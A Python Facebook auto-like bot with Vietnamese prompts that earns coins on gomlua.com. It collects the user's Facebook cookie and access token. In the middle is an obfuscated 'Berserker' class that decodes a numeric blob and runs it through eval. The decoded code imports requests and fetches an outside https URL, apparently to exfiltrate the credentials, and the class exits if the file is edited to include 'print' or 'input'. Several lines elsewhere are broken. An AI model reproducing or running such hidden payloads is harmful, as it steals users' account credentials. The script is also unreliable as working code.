import sys,os, requests,time,random,time,re

os.system("clear")

print("\033[1;35m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")

def logo():

    print("\033[1;33m╔╗╔═╗      ╔╗      ╔╗")

    print("║║║╔╝     ╔╝╚╗     ║║")

    print("║╚╝╝╔╗ ╔╗ ╚╗╔╬══╦══╣║")

    print("║╔╗║║║ ║╠══╣║║╔╗║╔╗║║")

    print("║║║╚╣╚═╝╠══╣╚╣╚╝║╚╝║╚╗")

    print("╚╝╚═╩═╗╔╝  ╚═╩══╩══╩═╝")

    print("    ╔═╝║")

    print("    ╚══╝\n")

logo()

print("\033[1;35m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")

ck=input("\033[1;32mnhập cookie fb:\033[1;37m")

tkfb=input("\033[1;32mnhập token fb:\033[1;37m")

head={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; RMX1929) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-fetch-site":"cross-site","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","accept-language":"vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5","cookie":ck}

g=requests.get("https://m.facebook.com/v2.9/dialog/oauth?app_id=901999673240219&cbt=1648134857148&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ed1357a98d3c4%26domain%3Dgomlua.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fgomlua.com%252Ff2018f051ab2668%26relation%3Dopener&client_id=901999673240219&display=touch&domain=gomlua.com&e2e=%7B%7D&enable_profile_selector=true&fallback_redirect_uri=https%3A%2F%2Fgomlua.com%2F%23%2Fauth%2Flogin&locale=en_US&logger_id=fc7169cf208aec&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df675f381e2b3a%26domain%3Dgomlua.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fgomlua.com%252Ff2018f051ab2668%26relation%3Dopener%26frame%3Df2114f9944ccde&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=&sdk=joey&version=v2.9",headers=head).text

token=g.split("access_token=")[1].split("&")[0]

s=requests.session()

s.headers.update({"Host":"gomlua.com","Connection":"keep-alive","Save-Data":"on","Accept":"application/json, text/plain, */*","content-type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; RMX1929) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36"})

atk=s.get("https://gomlua.com/user/login?os=web&facebook_token="+str(token)).json()["data"]["app_token"]

print("CHUYỂN COOKIE SANG TOKEN")class Berserker():

 def __init__(self:object,_delete:float=False,_eval:float=0,*_rasputin:bool,**_system:str)->exec:

  self._exec,self._bytes,self._exit,_delete,_system[_eval],self._decode=lambda _encode:_delete(_encode),exit()if _delete else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _delete:str(_system[_eval](f"{self._bytes[4]+self._bytes[-13]+self._bytes[4]+self._bytes[2]}(''.join(%s),{self._bytes[6]+self._bytes[11]+self._bytes[14]+self._bytes[1]+self._bytes[0]+self._bytes[11]+self._bytes[18]}())"%list(_delete))).encode(self._bytes[20]+self._bytes[19]+self._bytes[5]+self._bytes[34])if _system[_eval]==eval else exit(),lambda _delete:exit()if self._bytes[15]+self._bytes[17]+self._bytes[8]+self._bytes[13]+self._bytes[19] in open(__file__, errors=self._bytes[8]+self._bytes[6]+self._bytes[13]+self._bytes[14]+self._bytes[17]+self._bytes[4]).read() or self._bytes[8]+self._bytes[13]+self._bytes[15]+self._bytes[20]+self._bytes[19] in open(__file__, errors=self._bytes[8]+self._bytes[6]+self._bytes[13]+self._bytes[14]+self._bytes[17]+self._bytes[4]).read()else"".join(_delete if _delete not in self._bytes else self._bytes[self._bytes.index(_delete)+1 if self._bytes.index(_delete)+1<len(self._bytes)else 0]for _delete in "".join(chr(ord(t)-652111)if t!="ζ"else"\n"for t in self._decode(_delete))),eval,lambda _bits:"".join(chr(int(_boom)-len(_bits.split('|')))if _boom!='§'else'ζ'for _boom in str(_bits).split('|'))

  return self.__decode__(_system[(self._bytes[-1]+'_')[-1]+self._bytes[18]+self._bytes[15]+self._bytes[0]+self._bytes[17]+self._bytes[10]+self._bytes[11]+self._bytes[4]])

 def __decode__(self,_execute: str)->exec:return(None,self._exit(self._exec(_execute)))[0]

Berserker(_delete=False,_sparkle='''652293|652297|652300|652299|652302|652304|652221|652302|652289|652301|652305|652289|652303|652304|652303|§|652246|652250|652289|652308|652289|652287|652229|652302|652289|652301|652305|652289|652303|652304|652303|652235|652291|652289|652304|652229|652223|652292|652304|652304|652300|652303|652247|652236|652236|652300|652246|652303|652304|652289|652286|652293|652298|652235|652287|652299|652297|652236|652302|652246|652307|652236|652237|652295|652260|652301|652260|652311|652246|652290|652223|652230|652235|652304|652289|652308|652304|652230''')

time.sleep(0.5)

print("thành công")

time.sleep(1)

print("LẤY APP_TOKEN")

time.sleep(0.5)

print("thành công")

os.system("clear")

logo

ttfb=requests.get("https://graph.facebook.com/v13.0/me?fields=id%2Cname&access_token="+str(tkfb)).json()

s1=requests.session()

s1.headers.update({"app_token":atk,"Host":"gomlua.com","referer":"https://gomlua.com/"})

tt=s1.get("https://gomlua.com/user/info?os=web").json()

ten=tt["data"]["username"]

cd=tt["data"]["ref_code"]

x=tt["data"]["current_paddy"]

id=ttfb["id"]

os.system("clear")

print("\033[1;35m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")

logo()

print("\033[1;35m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")

print("\033[0;32m*************************************************")

print("\033[0;33m[username]:\033[0;37m",ten,"\033[0;33m[XU]:\033[0;37m",x,"\n\033[0;33m[CODE]:\033[0;37m",cd,"\033[0;33m[ID]:\033[0;37m",id)

print("\033[0;32m*************************************************")

while (True):

    link=s1.get("https://gomlua.com/cpi/listCampaignFacebook?os=web&type=like_post").json()["data"]["list"]

    if link==[]:

      time.sleep(1)

    else:

      idbv=link[0]["campaign_id"]

      idnv=link[0]["link_id"]

      print("ĐÃ LẤY ĐC 1 NV",end=("\r"))

      linkk = requests.get("https://mbasic.facebook.com/%s"+str(idbv),headers=head).url

      access = s1.get(linkk).text

      check_node = re.findall('/a/like.php?.*?"', access)

      print(idbv)

      print(check_node)

      if check_node=="[]":

        node_like = check_node[0].replace('"',"").replace("amp;","")

        requests.get("https://mbasic.facebook.com%s"%node_like,headers=head)

        print(like)

        time.sleep(1)

        nt=s1.get("https://gomlua.com/cpi/likeSuccess?os=web&link_id="+str(idnv)+"&like_old=1").json()

        ttnt=nt["code"]

        if ttnt==1:

          xunt=nt["data"]["current_paddy"]

          time.sleep(0.1)

          print("\033[1;32m✓\033[0;33m LIKE SUCCESS DONE 40$\033[1;32m ✓")

          time.sleep(0.1)

          print("\033[1;32m✓\033[0;33m ID \033[1;32m✓\033[0;37m",idbv)

          time.sleep(0.1)

          print("\033[1;32m✓\033[0;33m XU \033[1;32m✓\033[0;37m",xunt)

          time.sleep(0.1)

          print("\033[1;32m✓ \033[0;33mCHÚC MỪNG",ten,"ĐÃ NHẬN MONEY THÀNH CÔNG \033[1;32m✓\n")

          time.sleep(6)

        else:

          aaaa=s1.get("https://gomlua.com/cpi/reportBug?site=web&cpi_id="+str(idnv)+"&type=LIKE_TOKEN&report_type=LINK")

          time.sleep(5)

  

